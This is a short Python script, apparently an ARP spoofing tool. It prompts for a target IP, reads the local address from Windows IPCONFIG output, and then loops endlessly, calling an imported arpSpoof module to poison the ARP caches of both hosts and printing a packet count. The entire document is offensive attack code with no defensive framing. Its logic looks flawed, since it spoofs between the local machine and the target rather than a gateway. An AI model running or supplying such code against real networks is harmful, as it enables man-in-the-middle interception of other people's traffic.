import arp,os, re
arp = arp.arpSpoof()

targetip = input('Enter Target IP: ')
addresses = os.popen('IPCONFIG | FINDSTR /R "Ethernet adapter Local Area Connection .* Address.*[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*"')
ip = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', addresses.read()).group()

packetsSent = 0
while True:
     arp.spoof(ip, targetip)
     arp.spoof(targetip, ip)
     packetsSent +=2
     print(f'{packetsSent} packets sent')
